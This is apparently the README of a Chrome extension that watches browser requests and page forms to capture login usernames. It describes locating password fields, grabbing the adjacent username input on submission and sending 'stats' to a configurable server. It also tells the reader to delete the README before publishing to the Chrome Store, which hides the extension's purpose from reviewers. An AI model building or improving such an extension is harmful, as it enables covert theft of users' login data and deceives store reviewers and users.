This folder has all of the code for the Chrome browser extension.  

REMOVE this file before posting extension into Chrome Store.

For testing:

1.  Open Chrome Settings 
2.  Enable Developer Mode
3.  Click "Load unpacked extension" button
4.  Choose folder with extension

Once extension will be loaded to Chrome you can test it.

All settings can be found in background.js.
In first 2 lines you can change url and port which used for sending stats. 
By default http://localhost:8111 used.

How it works.
We have a dictionary with a field names. All POST\GET requests checked for this fields.
Default list is:
var _fields = [
    'username',
    'uname',
    'user',
    'login',
    'user_name'
];
In content script we check all forms to find password input. 
Once it found, we grab prev input name param and update our dictionary. 
On form submiting we check this field to find username.
